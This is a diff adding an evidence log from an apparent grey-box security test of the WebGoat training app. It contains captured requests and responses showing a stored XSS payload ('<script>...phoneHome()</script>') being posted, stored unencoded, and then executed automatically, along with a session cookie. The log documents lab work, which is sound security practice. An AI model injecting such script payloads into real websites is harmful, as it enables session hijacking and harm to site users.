@@ -1,0 +1,64 @@
+Source: Chrome DevTools Network panel (live browser session, authenticated as xtbuiquang)
+Run: 20261116-0912-webgoat-l1-greybox-run4 (session window starts 2026-11-16T02:13:57.255Z)
+Method used: capture-then-replay per intake Section 3f — solved/submitted via the real UI control
+(the "#postComment" icon button next to the comment input, found via DOM inspection:
+<input id="commentInput">...<i id="postComment" class="fa fa-edit">), not a hand-guessed curl body.
+
+=== Step 1: Genuine within-run stored XSS injection (POST /WebGoat/CrossSiteScriptingStored/stored-xss) ===
+Captured: Date header = Mon, 16 Nov 2026 02:14:49 GMT (within this run's window, started 02:13:57Z)
+Request Headers:
+  referer: http://10.242.10.31:8007/WebGoat/start.mvc
+  x-requested-with: XMLHttpRequest
+  content-type: application/json
+  cookie: JSESSIONID=7B298ABCC6E7DFEEF5F3CD34E540A4BE
+  origin: http://10.242.10.31:8007
+Request Body:
+  {"text":"RUN4-WITHIN-WINDOW-XSS-<script>webgoat.customjs.phoneHome()</script>"}
+Response Body:
+  {
+    "assignment" : "StoredXssComments",
+    "attemptWasMade" : true,
+    "feedback" : "It appears your payload should invoke the function. To tell for sure, you need to capture the value and put it in the form below. Then we will really know.",
+    "lessonCompleted" : true
+  }
+
+=== Step 2: Retrieval confirms unsanitized storage (GET /WebGoat/CrossSiteScriptingStored/stored-xss) ===
+Captured: Date header = Mon, 16 Nov 2026 02:14:49 GMT
+Response Body (relevant excerpt, newest first):
+  [ {
+    "user" : "xtbuiquang",
+    "dateTime" : "2026-11-16, 02:14:49",
+    "text" : "RUN4-WITHIN-WINDOW-XSS-<script>webgoat.customjs.phoneHome()</script>"
+  }, ... ]
+Analysis: the submitted <script> tag is stored verbatim, byte-for-byte, with no HTML-encoding.
+
+=== Step 3: Automatic execution proof (POST /WebGoat/CrossSiteScripting/phone-home-xss, fired by the injected script) ===
+Captured: Date header = Mon, 16 Nov 2026 02:14:49 GMT (same second as the injection — fired automatically
+by the browser parsing/executing the stored <script> tag when the comment list re-rendered; this request
+was NOT manually triggered by the tester)
+Request Headers:
+  webgoat-requested-by: dom-xss-vuln
+  x-requested-with: XMLHttpRequest
+  cookie: JSESSIONID=7B298ABCC6E7DFEEF5F3CD34E540A4BE
+Request Body:
+  param1=42&param2=24
+Response Body:
+  {
+    "assignment" : "DOMCrossSiteScripting",
+    "attemptWasMade" : true,
+    "feedback" : "Congratulations. You have successfully completed the assignment.",
+    "lessonCompleted" : true,
+    "output" : "phoneHome Response is 1086515932"
+  }
+
+Screenshot cross-check: evidence/chrome/21-stored-xss-run4-injection.png shows the comment row
+"xtbuiquang 2026-11-16, 02:14:49" with visible text "RUN4-WITHIN-WINDOW-XSS-" and nothing after it —
+the <script> portion is not rendered as text, consistent with it having executed as a live DOM element
+rather than being displayed/escaped. This image was re-opened and verbatim-compared against this claim
+before being cited (per the Section 3d screenshot cross-check rule).
+
+Conclusion: Unlike Run #3 (which could only cite a payload persisted from an earlier session,
+timestamped 00:44:51, predating that run's own window), this run performed and captured its OWN
+injection (02:14:49) and its OWN automatic execution proof, entirely within this run's session window
+(started 2026-11-16T02:13:57.255Z). F-08 (Stored XSS) is now evidenced by a genuine within-run
+request/response pair, closing the Run #3 evidence gap.
